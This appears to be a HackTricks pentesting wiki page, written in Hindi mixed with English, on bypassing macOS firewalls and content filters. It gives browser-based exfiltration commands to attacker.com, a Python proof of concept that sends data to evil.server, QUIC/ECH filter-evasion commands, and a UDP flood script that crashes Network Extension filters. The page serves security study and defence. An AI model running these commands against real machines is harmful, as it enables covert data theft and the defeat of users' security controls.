# macOS Firewalls को Bypassing करना

{{#include ../../banners/hacktricks-training.md}}

## पाई गई techniques

निम्न techniques कुछ macOS firewall apps में काम करती हुई पाई गईं।

### Whitelist names का दुरुपयोग

- उदाहरण के लिए malware को प्रसिद्ध macOS processes जैसे **`launchd`** के नाम से चलाना

### Synthetic Click

- यदि firewall user से permission मांगता है, तो malware से **allow पर click** करवाना

### **Apple signed binaries का उपयोग करें**

- जैसे **`curl`**, लेकिन **`whois`** जैसे अन्य binaries भी

### प्रसिद्ध Apple domains

Firewall **`apple.com`** या **`icloud.com`** जैसे प्रसिद्ध Apple domains से connections की अनुमति दे सकता है। और iCloud का उपयोग C2 के रूप में किया जा सकता है।

### Generic Bypass

Firewalls को bypass करने के लिए कुछ ideas

### Allowed traffic की जाँच करें

Allowed traffic जानने से आपको संभावित whitelisted domains या उन applications की पहचान करने में मदद मिलेगी जिन्हें उन तक access करने की अनुमति है
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

DNS resolutions **`mdnsreponder`** signed application के माध्यम से की जाती हैं, जिसे संभवतः DNS servers से contact करने की अनुमति होगी।<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Browser apps के माध्यम से

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Processes injections के माध्यम से

यदि आप किसी ऐसे **process में code inject** कर सकते हैं जिसे किसी भी server से connect करने की अनुमति है, तो आप firewall protections को bypass कर सकते हैं:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
जुलाई 2024 में Apple ने Safari/WebKit में मौजूद एक critical bug को patch किया, जो Screen Time parental controls द्वारा उपयोग किए जाने वाले system-wide “Web content filter” को bypass कर देता था।
एक विशेष रूप से तैयार किया गया URI (उदाहरण के लिए, double URL-encoded “://” के साथ) Screen Time ACL द्वारा recognise नहीं किया जाता, लेकिन WebKit इसे accept कर लेता है, इसलिए request बिना filter हुए बाहर भेज दी जाती है। इस कारण कोई भी process जो URL open कर सकता है (जिसमें sandboxed या unsigned code भी शामिल है), user या MDM profile द्वारा explicitly blocked domains तक पहुंच सकता है।<sup>[2]</sup>

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### शुरुआती macOS 14 “Sonoma” में Packet Filter (PF) rule-ordering bug
macOS 14 के beta cycle के दौरान Apple ने **`pfctl`** के आसपास मौजूद userspace wrapper में एक regression पेश किया।
`quick` keyword के साथ जोड़े गए rules (जिनका उपयोग कई VPN kill-switches द्वारा किया जाता है) चुपचाप ignore किए जा रहे थे, जिससे VPN/firewall GUI के *blocked* दिखाने पर भी traffic leaks हो रहे थे। इस bug की पुष्टि कई VPN vendors ने की और इसे RC 2 (build 23A344) में ठीक कर दिया गया।

त्वरित leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple-signed helper services का दुरुपयोग (legacy – pre-macOS 11.2)
macOS 11.2 से पहले **`ContentFilterExclusionList`** लगभग 50 Apple binaries, जैसे **`nsurlsessiond`** और App Store, को Network Extension framework से लागू किए गए सभी socket-filter firewalls (LuLu, Little Snitch आदि) को bypass करने की अनुमति देता था।
Malware किसी excluded process को आसानी से spawn कर सकता था—या उसमें code inject कर सकता था—और पहले से allowed socket पर अपना traffic tunnel कर सकता था। Apple ने macOS 11.2 में exclusion list को पूरी तरह हटा दिया, लेकिन उन systems पर यह technique अभी भी relevant है जिन्हें upgrade नहीं किया जा सकता।<sup>[3]</sup>

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH से Network Extension domain filters को बायपास करना (macOS 12+)
NEFilter Packet/Data Providers, TLS ClientHello SNI/ALPN पर निर्भर करते हैं। **HTTP/3 over QUIC (UDP/443)** और **Encrypted Client Hello (ECH)** के साथ SNI encrypted रहता है, NetExt flow को parse नहीं कर सकता, और hostname rules अक्सर fail-open हो जाते हैं, जिससे malware DNS को छुए बिना blocked domains तक पहुंच सकता है।<sup>[5]</sup>

न्यूनतम PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
यदि QUIC/ECH अभी भी enabled है, तो यह आसान hostname-filter evasion path है।

### macOS 15 “Sequoia” Network Extension instability (2024–2025)
शुरुआती 15.0/15.1 builds third-party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne आदि) को crash कर देते हैं। जब filter restart होता है, macOS अपने flow rules हटा देता है और कई products fail-open हो जाते हैं। हजारों short UDP flows के साथ filter को flood करना (या QUIC/ECH को force करना) बार-बार crash trigger कर सकता है और C2/exfil के लिए एक window छोड़ सकता है, जबकि GUI अभी भी firewall के running होने का दावा करता है।<sup>[4]</sup>

त्वरित reproduction (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## आधुनिक macOS के लिए Tooling tips

1. GUI firewalls द्वारा generate किए गए वर्तमान PF rules का निरीक्षण करें:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. उन binaries की सूची बनाएं जिनके पास पहले से *outgoing-network* entitlement है (piggy-backing के लिए उपयोगी):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift में अपना Network Extension content filter programmatically register करें।
स्थानीय socket पर packets forward करने वाला एक minimal rootless PoC Patrick Wardle के **LuLu** source code में उपलब्ध है।

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: macOS Firewalls बनाना और तोड़ना](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass blocked content तक unrestricted access की अनुमति देता है (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple ने macOS Feature हटा दिया, जो Apps को Firewall Security bypass करने की अनुमति देता था - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [macOS Sequoia Update के बाद Cybersecurity Products काम करना बंद कर रहे हैं - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [खराब Sites से macOS Connections को रोकने में सहायता के लिए network protection का उपयोग करें - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
